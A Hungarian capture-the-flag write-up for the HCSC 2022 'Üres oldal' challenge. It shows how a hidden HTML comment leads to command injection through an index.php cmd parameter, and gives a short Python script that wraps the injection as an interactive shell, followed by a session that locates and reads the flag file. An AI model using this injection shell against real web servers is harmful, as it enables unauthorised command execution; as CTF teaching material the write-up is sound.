# Üres oldal

Lehet lemaradt a weboldal tartalma

http://10.10.(1-9).10:2002

## Megoldás

Talán a legegyszerűbb feladat volt az összes közül. A címen egy üresnek látszó
weboldal volt, de ha kicsit jobban mögé pillantunk:

```
> curl http://10.10.1.10:2002
 
<!-- <a href="/index.php?cmd=challenge.txt">here</a>  -->
```

Tetszőleges parancsot le tudunk futtatni egy HTTP GET-tel. Készítettem egy mini
shellt pythonban, hogy kényelmesebb legyen keresgélni

```
import requests


def run(cmd): 
    rsp = requests.get(f'http://10.10.1.10:2002/index.php?cmd=;{cmd}')
    print(rsp.text)

while True:
    cmd = input("ures> ")
    run(cmd)

```

Valami ilyesmi egy session:
```
ures> ls
<!-- <a href="/index.php?cmd=challenge.txt">here</a>  -->

challenge.txt
index.php

ures> cat challenge.txt
<!-- <a href="/index.php?cmd=challenge.txt">here</a>  -->

Yes, that's the challenge you need to solve. The flag is in the flag file somewhere.

ures> find / -name '*flag*' 2>/dev/null
<!-- <a href="/index.php?cmd=challenge.txt">here</a>  -->

/sys/devices/pnp0/00:03/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/var/hcsc2022secret/flag
/usr/lib/x86_64-linux-gnu/perl/5.30.0/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.30.0/bits/ss_flags.ph
/proc/sys/kernel/acpi_video_flags
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/sys/kernel/sched_domain/cpu2/domain0/flags
/proc/sys/kernel/sched_domain/cpu3/domain0/flags
/proc/kpageflags

ures> cat /var/hcsc2022secret/flag
<!-- <a href="/index.php?cmd=challenge.txt">here</a>  -->

HCSC{n0t_empty_it_is_never_empty}
ures>
```

